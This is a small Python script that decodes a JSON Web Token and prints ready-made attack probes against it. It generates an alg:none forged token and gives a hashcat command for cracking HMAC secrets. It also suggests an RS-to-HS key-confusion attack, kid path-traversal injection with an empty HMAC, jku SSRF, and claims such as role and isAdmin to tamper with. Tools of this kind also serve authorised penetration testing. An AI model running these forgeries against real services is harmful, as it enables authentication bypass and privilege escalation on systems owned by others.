#!/usr/bin/env python3
"""JWT decoder + quick attack probe. Usage: echo $TOKEN | python3 jwt-decode.py"""
import sys, json, base64, hashlib, hmac

def b64decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def try_none_attack(header_b64, payload_b64):
    h = json.loads(b64decode(header_b64))
    h['alg'] = 'none'
    new_h = base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=').decode()
    return f"{new_h}.{payload_b64}."

TOKEN = sys.stdin.read().strip() if not sys.stdin.isatty() else (sys.argv[1] if len(sys.argv) > 1 else sys.exit("Usage: echo JWT | python3 jwt-decode.py"))
parts = TOKEN.split('.')
if len(parts) < 2: sys.exit("Not a JWT")
header, payload, *_ = parts
try:
    h = json.loads(b64decode(header)); p = json.loads(b64decode(payload))
    print("=== HEADER ==="); print(json.dumps(h, indent=2))
    print("\n=== PAYLOAD ==="); print(json.dumps(p, indent=2))
    print(f"\nAlgorithm: {h.get('alg','?')}  Type: {h.get('typ','?')}")
    if h.get('kid'): print(f"Key ID: {h['kid']}  ← test path traversal: ../../../../dev/null")
    if h.get('jku'): print(f"JWKS URL: {h['jku']}  ← test SSRF / attacker-hosted JWKS")
    print(f"\n=== ATTACK PROBES ===")
    print(f"[alg:none forgery]  {try_none_attack(header, payload)}")
    if h.get('alg','').startswith('HS'):
        print(f"[HS→ crack] hashcat -m 16500 jwt.txt rockyou.txt")
    if h.get('alg','').startswith('RS'):
        print(f"[RS→HS confusion] python3 jwt_tool.py TOKEN -X k -pk public.pem")
    if h.get('kid'): print(f"[kid injection] modify kid → ../../../../dev/null → sign with empty HMAC")
    print(f"\n[Claim tamper targets] role={p.get('role','?')} sub={p.get('sub','?')} userId={p.get('userId','?')} isAdmin={p.get('isAdmin','?')}")
except Exception as e:
    print(f"Error: {e}")
